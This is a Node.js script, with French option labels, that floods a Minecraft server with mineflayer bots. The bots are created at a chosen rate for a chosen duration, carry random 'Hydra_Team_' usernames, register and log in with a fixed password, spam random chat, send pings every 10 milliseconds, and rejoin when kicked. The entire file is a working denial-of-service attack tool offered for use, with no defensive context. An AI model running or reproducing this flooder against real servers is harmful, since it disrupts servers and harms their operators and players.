process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
const fs = require('fs');
const mineflayer = require('mineflayer');
const { program } = require('commander');
const path = require('path');

program
  .requiredOption('--ip <type>', 'Adresse IP du serveur')
  .requiredOption('--bps <type>', 'Bots par seconde')
  .requiredOption('--time <type>', 'Temps en secondes')
  .requiredOption('--protocol <type>', 'Protocole')
  .requiredOption('--method <type>', 'Méthode');

program.parse(process.argv);

const options = program.opts();

const generateRandomString = (length) => {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
};

const moveBotRandomly = (bot) => {
  setInterval(() => {
    bot.setControlState('forward', Math.random() > 0.5);
    bot.setControlState('back', Math.random() > 0.5);
    bot.setControlState('left', Math.random() > 0.5);
    bot.setControlState('right', Math.random() > 0.5);
    bot.setControlState('jump', Math.random() > 0.5);
    bot.setControlState('sprint', Math.random() > 0.5);
  }, 500);
};

const sendPingFlood = (bot) => {
  setInterval(() => {
    bot._client.write('ping', { payload: Math.floor(Math.random() * 1000) });
  }, 10);
};

const createBot = () => {
  const botOptions = {
    host: options.ip,
    port: 25565,
    version: options.protocol,
    username: `Hydra_Team_${generateRandomString(5)}`, // Generating random username with 6 characters
    skipValidation: true,
  };

  const bot = mineflayer.createBot(botOptions);

  bot.on('spawn', () => {
    bot.chat('/register aaa123456aaa');
    bot.chat('/register aaa123456aaa aaa123456aaa');
    bot.chat('/login aaa123456aaa');
    bot.chat('/login aaa123456aaa aaa123456aaa');

    setInterval(() => {
      const randomMessage = generateRandomString(20);
      bot.chat(randomMessage);
    }, 2000);

    moveBotRandomly(bot);
    sendPingFlood(bot);
  });

  bot.on('end', () => {
    setTimeout(() => {
      createBot();
    }, 3000);
  });

  bot.on('error', (err) => {
  });
};

const startBots = () => {
  const interval = 1000 / options.bps;
  const totalBots = options.bps * options.time;
  let botsCreated = 0;

  const createBots = () => {
    if (botsCreated < totalBots) {
      createBot();
      botsCreated += 1;

      setTimeout(createBots, interval);
    }
  };

  createBots();
};

if (options.method === 'Flood') {
  startBots();
}
